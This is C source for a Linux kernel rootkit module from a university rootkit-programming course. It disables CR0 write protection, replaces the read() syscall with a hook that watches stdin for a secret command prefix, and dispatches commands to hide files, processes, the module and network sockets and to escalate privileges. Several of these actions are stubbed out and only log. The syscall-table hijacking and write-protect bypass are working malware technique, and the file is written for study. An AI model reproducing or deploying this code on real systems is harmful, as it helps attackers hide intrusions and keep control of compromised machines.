
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 7                                                             */
/*                                                                             */
/*   Filename: rootkit.c                                                       */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: November 2015                                                       */
/*                                                                             */
/*   Usage: ...                                                                */
/*                                                                             */
/*******************************************************************************/

#include <linux/module.h>		/* Needed by all kernel modules */
#include <linux/syscalls.h>		/* Needed for __NR_read */
#include <linux/list.h>			/* Needed for linked list interface */

#include "rootkit.h"
#include "sysmap.h"				/* Needed for ROOTKIT_SYS_CALL_TABLE */
//#include "process_masking.h"
//#include "module_masking.h"		/* Needed for ... */
//#include "file_masker.h"		/* Needed for ... */
//#include "privil_escalating.h"		/* Needed for ... */


MODULE_LICENSE("GPL");
//MODULE_DESCRIPTION("A rootkit :)");
//MODULE_VERSION("0.1");
//MODULE_AUTHOR("Matei<mateipavaluca@yahoo.com>") ;
//MODULE_AUTHOR("Nedko<nedko.stefanov.nedkov@gmail.com>");


/* Initialization function which is called when the module is
   insmoded into the kernel. It replaces the read() syscall. */
static int __init module_masker_start(void)
{
	disable_write_protect_mode();

	/* Store original read syscall address */
	syscall_table = (void *) ROOTKIT_SYS_CALL_TABLE;
	original_read_syscall = (void *) syscall_table[__NR_read];
	//original_getdents_syscall = (void *) syscall_table[__NR_getdents];

	/* Overwrite manipulated read syscall */
	syscall_table[__NR_read] = (unsigned long *) my_read_syscall;
	//syscall_table[__NR_getdents] = (unsigned long *) my_getdents_syscall;

	enable_write_protect_mode();

	prefix_matched_so_far = command_buf_index = parameter_buf_index = parameter_exists = 0;
	state = MATCHING_PREFIX;

	printk(KERN_INFO "rootkit: %s\n", "successfully inserted");

	/* A non 0 return value means init_module failed; module can't be loaded */
	return 0;
}


/* Cleanup function which is called just before module
   is rmmoded. It restores the original read() syscall. */
static void __exit module_masker_end(void)
{
	disable_write_protect_mode();

	/* Restore original read syscall */
	syscall_table[__NR_read] = (unsigned long *) original_read_syscall;
	//syscall_table[__NR_getdents] = (unsigned long *) original_getdents_syscall;

	enable_write_protect_mode();

	printk(KERN_INFO "rootkit: %s\n", "successfully removed");

	return;
}


void disable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Disable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 0. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 & ~CR0_WRITE_PROTECT_MASK);
}


void enable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Enable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 1. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 | CR0_WRITE_PROTECT_MASK);
}


asmlinkage long my_read_syscall(unsigned int fd, char __user *buf, size_t count)
{
	long ret;

	/* Call original read syscall */
	ret = original_read_syscall(fd, buf, count);

	/* If the read was not from STDIN don't do anything */
	if (fd != 0 || ret < 1)
		return ret;

	match_input(buf, ret);

	return ret;
}


static void match_input(char *buf, long count)
{
	long i;

	for (i=0 ; i<count ; i++)

		if (state == MATCHING_PREFIX)
			match_prefix(buf[i]);
		else if(state == MATCHING_COMMAND)
			match_command(buf[i]);
		else if(state == MATCHING_PARAMETER)
			match_parameter(buf[i]);
}


static void match_prefix(char ch)
{
	prefix_matched_so_far = (COMMAND_PREFIX[prefix_matched_so_far] == ch) ? prefix_matched_so_far+1 : 0;

	if (prefix_matched_so_far == strlen(COMMAND_PREFIX)) {
		state = MATCHING_COMMAND;
		prefix_matched_so_far = 0;
	}
}


static void match_command(char ch)
{
	if (command_buf_index > COMMAND_BUF_LEN) {
		state = MATCHING_PREFIX;
		command_buf_index = 0;
		return;
	}

	if (ch == ';') {
		state = MATCHING_PREFIX;
		command_buf[command_buf_index] = '\0';
		command_buf_index = 0;
		parameter_exists = 0;
		execute_command();
	} else if (ch == ' ') {
		state = MATCHING_PARAMETER;
		command_buf[command_buf_index] = '\0';
		command_buf_index = 0;
	} else {
		command_buf[command_buf_index] = ch;
		command_buf_index++;
	}
}


static void match_parameter(char ch)
{
	if (parameter_buf_index > PARAMETER_BUF_LEN) {
		state = MATCHING_PREFIX;
		parameter_buf_index = 0;
		return;
	}

	if (ch == ';') {
		state = MATCHING_PREFIX;
		parameter_buf[parameter_buf_index] = '\0';
		parameter_exists = (parameter_buf_index > 0);
		parameter_buf_index = 0;
		execute_command();
	} else {
		parameter_buf[parameter_buf_index] = ch;
		parameter_buf_index++;
	}
}


static void execute_command(void)
{
	char *endptr;
	int pid;

	if (!strcmp(command_buf, HIDE_FILE)) {
		printk(KERN_INFO "rootkit: command matched -> %s\n", HIDE_FILE);
		if (parameter_exists) {
			printk(KERN_INFO "rootkit: parameter -> %s\n", parameter_buf);
			//hide_file(parameter_buf);
		}

	} else if (!strcmp(command_buf, UNHIDE_FILE)) {
		printk(KERN_INFO "rootkit: command matched -> %s\n", UNHIDE_FILE);
		if (parameter_exists) {
			printk(KERN_INFO "rootkit: parameter -> %s\n", parameter_buf);
			//reveal_file(parameter_buf);
		}

	} else if (!strcmp(command_buf, HIDE_PROCESS)) {
		printk(KERN_INFO "rootkit: command matched -> %s\n", HIDE_PROCESS);
		if (parameter_exists) {
			printk(KERN_INFO "rootkit: parameter -> %s\n", parameter_buf);
			//pid = simple_strtol(parameter_buf, &endptr, 10);
			//mask_process(pid);
		}

	} else if (!strcmp(command_buf, UNHIDE_PROCESS)) {
		printk(KERN_INFO "rootkit: command matched -> %s\n", UNHIDE_PROCESS);
		if (parameter_exists) {
			printk(KERN_INFO "rootkit: parameter -> %s\n", parameter_buf);
			//pid = simple_strtol(parameter_buf, &endptr, 10);
			//unmask_process(pid);
		}

	} else if (!strcmp(command_buf, HIDE_MODULE)) {
		printk(KERN_INFO "rootkit: command matched -> %s\n", HIDE_MODULE);
		if (parameter_exists)
			printk(KERN_INFO "rootkit: parameter -> %s\n", parameter_buf);
		//hide_module();

	} else if (!strcmp(command_buf, UNHIDE_MODULE)) {
		printk(KERN_INFO "rootkit: command matched -> %s\n", UNHIDE_MODULE);
		if (parameter_exists)
			printk(KERN_INFO "rootkit: parameter -> %s\n", parameter_buf);
		//unhide_module();

	} else if (!strcmp(command_buf, HIDE_SOCKET_TCP4)) {
		printk(KERN_INFO "rootkit: command matched -> %s\n", HIDE_SOCKET_TCP4);
		if (parameter_exists)
			printk(KERN_INFO "rootkit: parameter -> %s\n", parameter_buf);

	} else if (!strcmp(command_buf, UNHIDE_SOCKET_TCP4)) {
		printk(KERN_INFO "rootkit: command matched -> %s\n", UNHIDE_SOCKET_TCP4);
		if (parameter_exists)
			printk(KERN_INFO "rootkit: parameter -> %s\n", parameter_buf);

	} else if (!strcmp(command_buf, HIDE_SOCKET_UDP4)) {
		printk(KERN_INFO "rootkit: command matched -> %s\n", HIDE_SOCKET_UDP4);
		if (parameter_exists)
			printk(KERN_INFO "rootkit: parameter -> %s\n", parameter_buf);

	} else if (!strcmp(command_buf, UNHIDE_SOCKET_UDP4)) {
		printk(KERN_INFO "rootkit: command matched -> %s\n", UNHIDE_SOCKET_UDP4);
		if (parameter_exists)
			printk(KERN_INFO "rootkit: parameter -> %s\n", parameter_buf);

	} else if (!strcmp(command_buf, HIDE_SOCKET_TCP6)) {
		printk(KERN_INFO "rootkit: command matched -> %s\n", HIDE_SOCKET_TCP6);
		if (parameter_exists)
			printk(KERN_INFO "rootkit: parameter -> %s\n", parameter_buf);

	} else if (!strcmp(command_buf, UNHIDE_SOCKET_TCP6)) {
		printk(KERN_INFO "rootkit: command matched -> %s\n", UNHIDE_SOCKET_TCP6);
		if (parameter_exists)
			printk(KERN_INFO "rootkit: parameter -> %s\n", parameter_buf);

	} else if (!strcmp(command_buf, ESCALATE_PRIVIL)) {
		printk(KERN_INFO "rootkit: command matched -> %s\n", ESCALATE_PRIVIL);
		if (parameter_exists)
			printk(KERN_INFO "rootkit: parameter -> %s\n", parameter_buf);
		//privil_escalate();
	}

	command_buf_index = parameter_buf_index = 0;
}


module_init(module_masker_start);
module_exit(module_masker_end);
